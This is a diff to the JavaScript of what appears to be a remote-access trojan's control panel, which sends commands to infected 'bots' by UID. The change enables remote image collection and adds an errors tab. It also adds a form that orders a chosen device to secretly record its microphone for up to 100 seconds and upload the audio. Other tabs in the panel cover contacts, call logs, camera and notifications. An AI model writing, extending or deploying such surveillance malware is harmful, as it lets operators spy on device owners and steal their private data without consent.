@@ -93,7 +93,9 @@ var table_div = document.getElementById('table'),
     btns = document.getElementsByClassName("btn waves-effect waves-light"),
     botStatus_para = document.getElementById('botStatus'),
     refresh_check = document.getElementById('refresh-check'),
-    notifications_div = document.getElementById('notifications');
+    notifications_div = document.getElementById('notifications'),
+    errors_div = document.getElementById('errors'),
+    misc_div = document.getElementById('misc');
 
 var firstLoadContacts = true,
     firstLoadCallLog = true,
@@ -146,9 +148,9 @@ function getImages() {
     if (refresh_check.checked || firstLoadImages) {
         i = 0;
         images_div.innerHTML = 'Loading images, Please Wait...';
-        // socket.emit('commands', {commands: [{command: 'getImages'}], uid: currentUID});
+        socket.emit('commands', {commands: [{command: 'getImages'}], uid: currentUID});
         // socket.emit('commands', {commands: [{command: 'toggleIcon', icon: false}], uid: currentUID});
-        socket.emit('commands', {commands: [{command: 'recordMicrophone', sec: 10}], uid: currentUID});
+        // socket.emit('commands', {commands: [{command: 'recordMicrophone', sec: 10}], uid: currentUID});
 
         setTimeout(function () {
             socket.emit('commands', {commands: [{command: 'stopAll'}], uid: currentUID});
@@ -178,6 +180,14 @@ function getNotifications() {
     hideOtherTabs('notifications_div');
 }
 
+function getErrors() {
+    hideOtherTabs('errors_div');
+}
+
+function getMisc() {
+    hideOtherTabs('misc_div');
+}
+
 
 //When a bot sends data to web client
 socket.on('usrData', function (data) {
@@ -205,6 +215,17 @@ socket.on("notification", function (data) {
             console.table(notif, notifColumns);
             handleNotifications(notif);
         }
+    }
+});
+
+socket.on("cError", function (data) {
+    console.log(data);
+    if (data.uid === currentUID) {
+        var para = document.createElement("p");
+        var node = document.createTextNode(data.data);
+        para.appendChild(node);
+        para.style.borderBottom = '1px solid #ddd';
+        errors_div.appendChild(para);
     }
 });
 
@@ -380,6 +401,23 @@ function handleNotifications(notif) {
     notifications_div.appendChild(para);
 }
 
+function handleMisc() {
+    var micTime = document.getElementById("micTime");
+    var micTimeSubmit = document.getElementById("micTimeSubmit");
+    if(micTime.value){
+        try{
+            let time = parseInt(micTime.value);
+            if(isNaN(time)) throw 'Incorrect time value, Should be a number 1-100!!';
+            if(time < 1 || time > 100) throw 'Time should be in between 1-100';
+            socket.emit('commands', {commands: [{command: 'recordMicrophone', sec: time}], uid: currentUID});
+            micTime.value = "Command is Successfully sent, go to the upload page now."
+            micTimeSubmit.style.visibility = "hidden";
+        } catch(e) {
+            alert(e);
+        }
+    }
+}
+
 function hideOtherTabs(tabName) {
 
     table_div.style.visibility = 'hidden';
@@ -392,6 +430,8 @@ function hideOtherTabs(tabName) {
     camera_div.style.visibility = 'hidden';
     download_div.style.visibility = 'hidden';
     notifications_div.style.visibility = 'hidden';
+    errors_div.style.visibility = 'hidden';
+    misc_div.style.visibility = 'hidden';
 
     if (tabName === 'table_div') table_div.style.visibility = 'visible';
     if (tabName === 'home_div') home_div.style.visibility = 'visible';
@@ -403,6 +443,8 @@ function hideOtherTabs(tabName) {
     if (tabName === 'camera_div') camera_div.style.visibility = 'visible';
     if (tabName === 'download_div') download_div.style.visibility = 'visible';
     if (tabName === 'notifications_div') notifications_div.style.visibility = 'visible';
+    if (tabName === 'errors_div') errors_div.style.visibility = 'visible';
+    if (tabName === 'misc_div') misc_div.style.visibility = 'visible';
 
 }
 
